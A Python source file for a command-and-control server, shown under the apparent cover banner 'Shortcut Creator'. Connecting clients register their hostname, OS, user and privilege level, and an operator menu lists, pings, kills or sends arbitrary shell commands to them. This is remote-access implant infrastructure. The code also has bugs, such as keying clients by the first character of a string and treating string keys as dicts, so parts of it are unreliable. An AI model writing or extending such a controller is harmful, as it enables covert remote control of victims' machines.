import socket
import threading
import time
import ipaddress    
import copy

HOST='localhost'
LISTEN_PORT=9999
BUFFER_SIZE=4096
TIMEOUT_TIME=60

'''
Netflow Diagram
Server listens on port LISTEN_PORT
Clients connect on LISTEN_PORT
Server spins up a thread to handle each connection
Client sends "REG {ipaddress} | {hostname} | {sys_os} | {cur_user} | {elevated}"
Server parses and records this, and then sends back "REG_R"
Clients await message from server in format "CMD {command}"
Clients send response to server in format "CMD_R {result.returncode} | {result.stdout} | {result.stderr}"
    This may take up to 60 seconds and server shouldnt prompt them again in the meantime
Server can send KILL to request that client exit
Client will respond with KILL_R if server requests client to exit or if there's an error
'''

"""
Datastructure Diagram
Client info is stored as a dictionary where each client's IP address is the key to a second dictionary of info about that client
Currently, client info is composed of its assigned IP address, hostname, OS, the user running the client script, whether the script is running with elevated permissions or not, and the thread handling it
clients_info['192.168.1.1'] # ['192.168.1.1', 'mybox', 'Windows 10', 'Admin', 1, socket, thread]
client_info ={
    "ipaddr" : parts[0],
    "hostname" : parts[1],
    "sys_os" : parts[2],
    "cur_user" : parts[3],
    "elevated" : parts[4],
    "cs" : client_sock,
    "thrd" : thread
}
"""

clients_info = {}
clients_dead_info = {}
clients_lock = threading.Lock()

class style():
  RED       = '\033[31m'
  GREEN     = '\033[32m'
  BLUE      = '\033[34m'
  RESET     = '\033[0m'

def main():

    # Setup the server
    server_sock = socket.socket()
    server_sock.bind((HOST,LISTEN_PORT))
    server_sock.listen(5)
    server_sock.settimeout(TIMEOUT_TIME)
    print("Server is listening...")

    handle_connect_thread = threading.Thread(target=handle_connections, args=(server_sock,), daemon=True)
    handle_connect_thread.start()

    while True:
        command_menu()

def print_pretty(clients_alive,clients_dead,show_dead=True):
    sorted_dict = dict(sorted(clients_alive.items(), key=lambda item: ipaddress.IPv4Address(item[0])))
    for nested in sorted_dict.values():
        nested["alive"] = True
    copy_dead = copy.deepcopy(clients_dead)
    for nested in copy_dead.values():
        nested["alive"] = False

    sorted_dict.update(copy_dead)
    sorted_dict = dict(sorted(sorted_dict.items(), key=lambda item: ipaddress.ip_address(item[0])))
    for client in sorted_dict.values():
        if client["alive"]:
            status_color = style.GREEN
        else:
            status_color = style.RED
        print(f"{status_color}{client.values()}{style.RESET}")

def command_menu():
    global clients_info

    for line in [f"\n\t************************************************",f"\t***************{style.GREEN} Shortcut Creator {style.RESET}***************","\t************************************************"]:
        print(line)
    print("\n\nEnter Selection:\n")
    for line in ["1 - List connected clients","2 - Ping Check","3 - Kill a client","4 - Send Command","5 - Exit"]: #,"4 - Exit"
        print("\t"+line)
    print("") # extra blank line

    response = input(f"Please enter a number").strip()
    if response == "1": # List
        with clients_lock:
            print_pretty(clients_info,clients_dead_info,True)

    elif response == "2": # Ping check
        ping_all(True)

    elif response == "3": # Kill by IP
        client_ipaddr = input("Client IP to kill: ").strip()
        with clients_lock:
            client = clients_info[client_ipaddr]
            client["cs"].send(b"KILL")
            # TODO close?

    elif response == "4": # Command by IP
        client_ipaddr = input("Client IP to command: ").strip()
        client_cmd = input("Command: ").strip()
        with clients_lock:
            client = clients_info[client_ipaddr]
            client["cs"].send(f"CMD {client_cmd}".encode())

    elif response == "5": # Exit
        confirm = input("Are you sure you want to exit? This will kill the server. Type y/n: ").strip()
        if confirm == "y":
            exit()

def ping_all(noisy=False):
    global clients_info
    threads = []

    with clients_lock:
        clients_snapshot = list(clients_info)  # make a copy to safely iterate

    for client in clients_snapshot:
        thread = threading.Thread(target=ping_client, args=(client, noisy))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()  # Wait for all pings to finish

def ping_client(client, noisy=False):
    cs = client["cs"]
    ip = client["ipaddr"]
    try:
        cs.settimeout(5)
        cs.send(b"PING")
        response = cs.recv(1024)
        if not response: # empty
            raise ValueError("Received empty response")
        cs.settimeout(TIMEOUT_TIME)
        if noisy:
            print(f"Client {ip} is alive")
    except Exception as e:
        if noisy:
            print(f"Client {ip} is dead: {e}")
        with clients_lock:
            if client in clients_info:
                clients_dead_info[ip] = clients_info.pop(ip)

'''
Listens for incoming client connections and attempts to process them.
Parses initial register message and updates variables as needed.
If it receives a connection from an IP already registered, kills the old connection
Spins off a separate thread for continued handling of client comms.
'''
def handle_connections(server_sock):
    global clients_info

    # Await connections
    while True:
        client_sock,addr = server_sock.accept()
        client_sock.settimeout(TIMEOUT_TIME)
        print(f"Got new connection from {addr}")

        try:
            received_msg = client_sock.recv(BUFFER_SIZE).decode()
        except Exception as e:
            print(f"Failed to receive message from {addr}: {e}")
            client_sock.close()
            continue

        if received_msg.startswith("REG"):
            # Register msg
            # "REG {ipaddress} | {hostname} | {sys_os} | {cur_user} | {elevated}"
            data = received_msg[len("REG "):]
            parts = [part.strip() for part in data.split('|')]
            print(f"Client resolves to {data[0]}")

            if len(parts) != 5:
                print(f"Malformed REG message from {addr}: {received_msg}")
                client_sock.send(b"KILL")
                client_sock.close()
                continue

            thread = threading.Thread(target = handle_client, args=(client_sock,addr,data[0]))
            client_info ={
                "ipaddr" : parts[0],
                "hostname" : parts[1],
                "sys_os" : parts[2],
                "cur_user" : parts[3],
                "elevated" : parts[4],
                "cs" : client_sock,
                "thrd" : thread
            }

            with clients_lock:
                if data[0] in clients_info:
                    print(f"Client {data[0]} appears to already be connected. Killing old client...")
                    old_info = clients_info[client_info["ipaddr"]]
                    old_info["cs"].send(b"KILL")
                    #clients_info.pop(client_info["ipaddr"]) #no need as it gets replaced
                clients_info[client_info["ipaddr"]] = client_info
            
            client_sock.send(b"REG_R")
            thread.start()
        else:
            print(f"Unknown startup msg from {addr}: {received_msg}. Killing client.")
            client_sock.send(b"KILL")
            client_sock.close()

def handle_client(client_sock,addr,real_addr): #real addr is a new copy so dont worry about
    global clients_info

    while True:
        try:
            received_msg = client_sock.recv(BUFFER_SIZE).decode()
        except ConnectionResetError:
            print(f"Client {real_addr} lost connection")
            with clients_lock:
                clients_dead_info[real_addr] = clients_info.pop(real_addr)
            client_sock.close()
            break
        if received_msg.startswith("KILL_R"):
            print(f"Client {real_addr} is exiting with status {received_msg[len("KILL_R "):]}")
            with clients_lock:
                clients_dead_info[real_addr] = clients_info.pop(real_addr)

main()